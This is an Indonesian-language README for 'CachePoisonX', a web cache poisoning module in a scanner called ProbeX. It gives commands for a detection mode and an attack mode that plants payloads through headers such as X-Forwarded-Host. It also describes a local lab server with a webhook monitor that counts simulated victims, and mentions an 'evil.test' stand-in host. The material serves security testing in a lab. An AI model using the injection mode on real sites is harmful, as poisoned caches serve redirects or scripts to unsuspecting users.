# CachePoisonX — Terintegrasi di ProbeX

Tool cache poisoning (deteksi + injeksi) dari `demo.zip` sudah digabungkan
ke dalam paket ProbeX di `/home/liiannn/Downloads/ProbeX/`.

## Struktur folder

```
/home/liiannn/Downloads/ProbeX/
├── probex.py                          <- CLI utama ProbeX (ditambahi --cache-inject)
├── probex/core/scanner.py             <- daftar modul CachePoisonX terdaftar
├── probex/core/config.py              <- opsi cache_inject_payload / header
├── probex/modules/cachepoisonx/       <- paket CachePoisonX (poisoning, injector, report)
├── probex/modules/cachepoisonx_detector.py  <- wrapper deteksi read-only
├── probex/modules/cachepoisonx_injector.py  <- wrapper injeksi attack mode
└── tes_lab/                           <- lab server & demo script
    ├── lab_cache_origin.py            <- server origin + cache + webhook (port 8899)
    ├── demo.sh                        <- script demo cache poisoning via curl
    ├── CARA-JALANIN.md                <- panduan cara jalanin
    └── PENJELASAN.md                  <- file ini
```

## Dua mode yang dipisah

### 1. Deteksi (scan read-only) — tidak menanam payload

```bash
cd /home/liiannn/Downloads/ProbeX
PROBEX_CONSENT=1 python3 probex.py http://127.0.0.1:8899 --module cache-poisoning --no-safe --no-banner
```

- Fingerprint layer cache di URL terpisah (tidak mencemari URL target)
- Cache key differential matrix per header
- Probe header unkeyed + verifikasi replay (harus cache HIT)
- Tidak mengubah state cache target

### 2. Injeksi (attack mode) — benar-benar tanam payload ke cache

```bash
cd /home/liiannn/Downloads/ProbeX
PROBEX_CONSENT=1 python3 probex.py http://127.0.0.1:8899/article/demo --cache-inject --no-safe --no-banner
```

Butuh `--no-safe`. Tanpa passive bawaan agar budget tidak habis sebelum injeksi selesai.

Flag tambahan:
- `--payload` — profil (`host|webhook|script|redirect|path`), path file, atau literal. Boleh diulang.
- `--header` — header vektor. Boleh diulang. Default: `X-Forwarded-Host`.

Contoh payload file:
```bash
PROBEX_CONSENT=1 python3 probex.py http://127.0.0.1:8899/article/demo \
  --cache-inject --no-safe --no-banner --payload /path/to/file.txt --header X-Forwarded-Host
```

Contoh payload custom satu baris ke webhook lab:
```bash
PROBEX_CONSENT=1 python3 probex.py http://127.0.0.1:8899/article/demo \
  --cache-inject --no-safe --no-banner --payload "127.0.0.1:8899/_hook/proof" --header X-Forwarded-Host
```

## Alur injeksi (3 langkah)

1. **Clear cache** lab (`/_cache/clear`) — mencegah bug `CACHE_WARM`
2. **INJECT** — kirim request dengan `<header>: <payload>` ke URL target
3. **REPLAY** — request tanpa header (pura-pura korban), verifikasi `X-Cache: HIT` + payload masih ada di body

Verdikt: `INJECTED`, `NOT_STICKY`, `PERSISTS_NO_CACHE`, `IGNORED`, `CACHE_WARM`.

Simulasi korban: 3 replay tanpa header, dilaporkan berapa yang teracuni.

## Lab server & monitor

Lab ada di `tes_lab/lab_cache_origin.py`. Nyalakan di terminal 1:

```bash
cd /home/liiannn/Downloads/ProbeX/tes_lab
python3 lab_cache_origin.py 8899
```

Endpoint lab:
- `GET /article/<slug>` — halaman artikel (di-cache)
- `GET /_hook/<token>` — webhook receiver (1x1 png + catat hit)
- `GET /_monitor` — dashboard live (auto-refresh 1,5 detik)
- `GET /_events` — JSON semua hit webhook
- `GET /_events/clear` — kosongkan log
- `GET /_cache/clear` — kosongkan cache

Buka monitor di browser:
```
http://127.0.0.1:8899/_monitor
```

Lalu jalankan injeksi dari terminal 2 (ProbeX). Buka halaman target:
```
http://127.0.0.1:8899/article/demo
```

Monitor akan nambah sendiri setiap kali ada korban yang membuka halaman teracuni.

## Catatan penting

- Payload untuk **header** harus **satu baris** (HTTP header tidak boleh newline). Payload file multiline (mis. PHP) akan ditolak oleh `requests`.
- Payload `evil.test` tidak bisa di-resolve browser → webhook monitor nol. Arahkan ke lab sendiri: `--payload "127.0.0.1:8899/_hook/proof"`.
- Butuh `PROBEX_CONSENT=1` atau ketik `ya` saat prompt izin.
- `--cache-inject` butuh `--no-safe`.
- Target harus punya layer cache (`lab_cache_origin.py` sudah mensimulasikan ini).
- DVWA polos gak punya cache → mode attack tidak akan berhasil (bukan bug tool, tapi DVWA gak punya cache).
- Laporan ProbeX tersimpan di `reports/` (JSON).

## Hasil tes (verifikasi nyata)

Terhadap `lab_cache_origin.py` di port 8899:
- Deteksi: berjalan, tidak crash, `Findings: 0` (karena root `/` tidak ada header cache, hanya `/article/<slug>` yang punya)
- Injeksi: `INJECTED`, cache HIT, simulasi korban `3/3` menerima payload
